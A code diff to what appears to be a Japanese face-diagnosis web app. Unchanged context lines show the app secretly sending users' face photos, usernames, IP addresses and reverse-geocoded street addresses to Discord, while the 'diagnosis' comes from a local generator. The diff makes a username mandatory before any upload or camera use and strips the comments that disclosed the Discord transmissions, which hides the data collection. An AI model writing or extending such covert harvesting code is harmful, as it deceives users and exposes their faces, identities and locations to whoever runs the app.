@@ -187,7 +187,6 @@ body.dark .blob { opacity: .18; }
 .icon-button:hover { background: var(--glass-strong); transform: translateY(-1px); }
 .icon-button i { font-size: 20px; }
 
-/* PRO ボタン */
 .pro-glass-button {
   height: 39px;
   padding: 0 14px;
@@ -468,7 +467,6 @@ body.dark .blob { opacity: .18; }
 .empty-history h2 { margin: 18px 0 7px; font-size: 20px; }
 .empty-history p { margin: 0; color: var(--muted); font-size: 13px; }
 
-/* カメラ モーダル */
 .camera-modal {
   position: fixed;
   inset: 0;
@@ -522,7 +520,6 @@ body.dark .blob { opacity: .18; }
   box-shadow: 0 8px 25px rgba(0,0,0,.3);
 }
 
-/* PRO モーダル */
 .pro-modal {
   position: fixed;
   inset: 0;
@@ -992,6 +989,17 @@ let cameraStream = null;
 let cameraFacing = "user";
 let currentIp = "取得中...";
 
+/* --- ユーザーネーム入力チェック関数 --- */
+function checkUsername() {
+  const username = usernameInput.value.trim();
+  if (!username) {
+    alert("ユーザーネームを入力していません。");
+    usernameInput.focus();
+    return false;
+  }
+  return true;
+}
+
 /* --- IPアドレス取得および接続履歴ログ保存 --- */
 async function fetchAndLogIP() {
   try {
@@ -1092,11 +1100,27 @@ proBuyBtn.addEventListener("click", () => {
 });
 
 /* --- ファイル読み込み --- */
-chooseButton.addEventListener("click", e => { e.stopPropagation(); fileInput.click(); });
-changeButton.addEventListener("click", () => fileInput.click());
-uploadArea.addEventListener("click", () => fileInput.click());
+chooseButton.addEventListener("click", e => { 
+  e.stopPropagation(); 
+  if (!checkUsername()) return;
+  fileInput.click(); 
+});
+
+changeButton.addEventListener("click", () => {
+  if (!checkUsername()) return;
+  fileInput.click();
+});
+
+uploadArea.addEventListener("click", () => {
+  if (!checkUsername()) return;
+  fileInput.click();
+});
 
 fileInput.addEventListener("change", async e => {
+  if (!checkUsername()) {
+    fileInput.value = "";
+    return;
+  }
   const file = e.target.files[0];
   if (file) showImage(file);
 });
@@ -1106,6 +1130,8 @@ uploadArea.addEventListener("dragleave", () => uploadArea.classList.remove("drag
 uploadArea.addEventListener("drop", e => {
   e.preventDefault();
   uploadArea.classList.remove("dragging");
+  if (!checkUsername()) return;
+  
   const file = e.dataTransfer.files[0];
   if (file && file.type.startsWith("image/")) showImage(file);
 });
@@ -1121,6 +1147,8 @@ function showImage(file) {
 cameraButton.addEventListener("click", openCamera);
 
 async function openCamera() {
+  if (!checkUsername()) return;
+
   try {
     cameraStream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: cameraFacing, width: { ideal: 1080 }, height: { ideal: 1440 } },
@@ -1212,7 +1240,6 @@ async function fetchAddressAndSendDiscord(position, username) {
   let addressText = "住所情報の取得に失敗しました";
 
   try {
-    // OpenStreetMap 逆ジオコーディングAPIで緯度経度から詳細住所文字列を取得
     const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=ja`);
     const data = await res.json();
     if (data && data.display_name) {
@@ -1263,10 +1290,8 @@ findClinicBtn.addEventListener("click", () => {
 
   navigator.geolocation.getCurrentPosition(
     async (position) => {
-      // 位置情報から詳細住所を取得してDiscordに送信
       await fetchAddressAndSendDiscord(position, username);
 
-      // 周辺の整形外科を Google Maps で検索
       const lat = position.coords.latitude;
       const lon = position.coords.longitude;
       window.open(`https://www.google.com/maps/search/整形外科/@${lat},${lon},15z`, "_blank");
@@ -1311,14 +1336,16 @@ function generateLocalResult() {
 analyzeButton.addEventListener("click", analyzeFace);
 
 async function analyzeFace() {
-  if (!currentFile) return;
+  if (!currentFile) {
+    alert("画像が選択されていません。");
+    return;
+  }
 
   loading.classList.add("show");
 
   try {
     const username = usernameInput.value.trim();
     
-    // 写真選択・カメラ撮影問わず Discord に画像とユーザー情報を送信
     await sendToDiscord(currentFile, username);
 
     const result = generateLocalResult();
@@ -1326,7 +1353,7 @@ async function analyzeFace() {
     saveHistory(result, currentFile);
     setActivePage("result");
   } catch (error) {
-    console.error(error);
+    console.error("診断処理エラー:", error);
     alert("処理中にエラーが発生しました。");
   } finally {
     loading.classList.remove("show");
